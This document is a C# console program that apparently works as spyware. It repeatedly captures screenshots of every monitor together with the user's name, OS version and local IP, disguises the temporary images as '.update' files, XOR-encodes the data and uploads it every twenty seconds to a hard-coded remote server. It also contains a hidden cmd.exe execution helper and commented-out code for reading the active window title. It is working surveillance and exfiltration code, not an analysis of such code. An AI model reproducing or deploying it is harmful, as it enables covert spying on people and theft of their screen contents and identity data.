using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.Drawing;
using System.IO;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Net;

namespace ConsoleApp1
{
    internal class Program
    {
        static readonly string SERVER_URL = "10.10.14.83";
        static string MyIpInfo;
        static readonly string WindowsUsername = WindowsIdentity.GetCurrent().Name;
        static readonly string WindowsName = Environment.OSVersion.ToString();

        static void Main(string[] args)
        {

            // StartGetMyIp();

            MyIpInfo = GetLocalIPAddress();

            int interval = 0;

            while (true)
            {
                interval++;
                try
                {
                    //string activeWindowTitle = GetActiveWindowTitle();
                    JObject dataObj = new JObject
                    {
                        { "ip", MyIpInfo },
                        { "user", $"{WindowsUsername} / {WindowsName}" },
                        //{ "window", activeWindowTitle },
                        { "interval", interval },
                        { "screen", ScreenJArray()}
                    };
                    var uploadBytes = Encoding.UTF8.GetBytes(dataObj.ToString(Newtonsoft.Json.Formatting.None));
                    Encrypt(ref uploadBytes);
                    try
                    {
                        SimpleHttpClient.HttpPostBytes($"http://{SERVER_URL}:9932/upload", uploadBytes);
                    }
                    catch
                    {
                        Thread.Sleep(1000);
                        SimpleHttpClient.HttpPostBytes($"http://{SERVER_URL}:9932/upload", uploadBytes);
                    }
                }
                catch (Exception ex)
                {
                }
                Thread.Sleep(20000);
            }

        }

        static void StartGetMyIp()
        {
            Thread thread = new Thread(() => GetMyIpInfo());
            thread.Start();
        }

        static void GetMyIpInfo()
        {
            try
            {
                if (MyIpInfo == null)
                {
                    MyIpInfo = SimpleHttpClient.HttpGet("http://ip-api.com/json");
                }
            }
            catch (Exception ex)
            {
            }
        }

        static string RunCmd(string cmd)
        {
            using (Process p = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    FileName = "cmd.exe",
                    Arguments = "/c " + cmd,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true
                }
            })
                try
                {
                    p.Start();
                    StreamReader sr = p.StandardOutput;
                    string result = sr.ReadToEnd().Trim();
                    sr.Close();
                    return result;
                }
                catch { return null; }
        }

        public static List<string> getAllScreen()
        {
            List<string> list = new List<string>();
            Screen[] screens;
            screens = Screen.AllScreens;
            try
            {
                int screenIndex = 0;
                foreach (Screen screen in screens)
                {
                    screenIndex++;
                    try
                    {
                        string tempFilename = DateTime.UtcNow.Ticks.ToString() + screenIndex + ".update";
                        var bitmap = new Bitmap(screen.Bounds.Width, screen.Bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb);
                        var graphics = Graphics.FromImage(bitmap);
                        graphics.CopyFromScreen(screen.Bounds.X, screen.Bounds.Y, 0, 0, screen.Bounds.Size, CopyPixelOperation.SourceCopy);
                        graphics.Flush();
                        bitmap.Save(tempFilename, ImageFormat.Png);
                        bitmap.Dispose();
                        graphics.Dispose();
                        list.Add(Convert.ToBase64String(File.ReadAllBytes(tempFilename)));
                        File.Delete(tempFilename);
                    }
                    catch (Exception ex)
                    {
                    }
                }
            }
            catch (Exception ex)
            {
                try
                {
                    var files = Directory.EnumerateFiles("*.update");
                    foreach (string file in files)
                        File.Delete(file);
                }
                catch (Exception ex2)
                {
                }
            }
            return list;
        }

        public static JArray ScreenJArray()
        {
            var screenArray = getAllScreen();
            if (screenArray == null) return null;
            return JArray.FromObject(screenArray);
        }

        private static readonly byte[] KEY = { 1, 2, 3, 4 };

        private static void Encrypt(ref byte[] input)
        {
            int length = input.Length;
            int keyLength = KEY.Length;
            for (int i = 0; i < length; i++)
                input[i] ^= KEY[i % keyLength];
        }

        //public static string GetActiveWindowTitle()
        //{
        //    try
        //    {
        //        const int nChars = 256;
        //        StringBuilder Buff = new StringBuilder(nChars);
        //        IntPtr handle = GetForegroundWindow();

        //        if (GetWindowText(handle, Buff, nChars) > 0)
        //        {
        //            return Buff.ToString();
        //        }
        //    }
        //    catch { }
        //    return null;
        //}

        public static string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            throw new Exception("No network adapters with an IPv4 address in the system!");
        }
    }

}
